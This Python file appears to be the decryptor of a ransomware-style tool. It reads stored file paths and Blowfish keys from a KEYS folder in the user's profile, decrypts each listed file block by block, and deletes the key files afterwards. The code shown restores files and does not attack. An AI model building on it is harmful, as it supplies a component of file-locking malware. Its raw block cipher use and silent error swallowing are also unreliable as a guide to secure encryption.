import blowfish
from cryptography.fernet import Fernet
import os
from colorama import init, Fore, Back, Style
from termcolor import colored
from cryptography.exceptions import UnsupportedAlgorithm
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization

user = os.getlogin()
keys_folder = 'C:\\Users\\' + user + '\\KEYS'

def get_details(file):
	file = file.split('\\')
	length = len(file)
	filename = file[length-1]
	path = ''
	for i in range(length-1):
		path += file[i] + "\\"
	return [path, filename]


def decrypt():
	global user, keys_folder
	keyfile = open(keys_folder + '\\key.key','rb')
	path_and_key = keyfile.readline()
	while path_and_key:
		try:
			file = path_and_key.decode().split('-->')[0]
			key = path_and_key.decode().split('-->')[1].encode().strip()
			cipher = blowfish.Cipher(key)
			cfile = open(file,'rb')
			details = get_details(file)
			pfile = open((details[0]+details[1]+'.temp'),'wb')
			data = cfile.read(8)
			lst = []
			while data:
				bytes = len(data)
				pfile.write(cipher.decrypt_block(data))
				data = cfile.read(8)
			cfile.close()
			pfile.close()
			os.remove((details[0]+details[1]))
			os.rename((details[0]+details[1]+'.temp'), (details[0]+details[1]))
		except:
			pass

		try:
			path_and_key = keyfile.readline().strip()
		except:
			pass

def decryptKey():
	global user, keys_folder
	keyfile = open(keys_folder + '\\symmetricKey.key','rb')
	path_and_key = keyfile.readline()
	keyfile.close()
	file = path_and_key.decode().split('-->')[0]
	key = path_and_key.decode().split('-->')[1].encode().strip()
	cipher = blowfish.Cipher(key)
	cfile = open(file,'rb')
	details = get_details(file)
	pfile = open((details[0]+details[1]+'.temp'),'wb')
	data = cfile.read(8)
	lst = []
	while data:
		bytes = len(data)
		pfile.write(cipher.decrypt_block(data))
		data = cfile.read(8)
	cfile.close()
	pfile.close()
	os.remove(keys_folder + "\\symmetricKey.key")
	os.remove((details[0]+details[1]))
	os.rename((details[0]+details[1]+'.temp'), (details[0]+details[1]))

def doit():
	global user, keys_folder
	try:
		decryptKey()
	except:
		print(colored(Fore.RED + "SOMETHING WENT WRONG!!!"))
	decrypt()
	user = os.getlogin()
	os.remove(keys_folder + "\\key.key")
	os.rmdir(keys_folder)
	
#if __name__ == '__main__':
#	main()